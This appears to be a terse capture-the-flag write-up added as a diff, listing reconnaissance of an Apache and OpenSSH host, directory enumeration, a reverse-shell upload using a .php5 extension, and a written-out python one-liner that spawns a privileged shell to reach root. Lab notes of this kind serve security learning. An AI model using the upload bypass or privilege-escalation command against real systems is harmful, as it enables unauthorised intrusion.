@@ -1,0 +1,29 @@
+Reconnaissance
+
+port 80 service Apache httpd 2.4.29
+port 22 service Openssh 7.6p1
+
+---------------------
+enumerate directories
+
+/panel/
+/uploads/
+
+--------------------
+upload reverse shell
+
+using extension .php5
+replace address and port
+open port 8888 in localhost to connect
+
+-----------------
+Privilege escalation
+
+from sudo rights
+script: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' with replacement relative path ./ to absolote path /usr/bin/python
+update rights to root and go to root to read flag
+
+-----------------
+
+
+
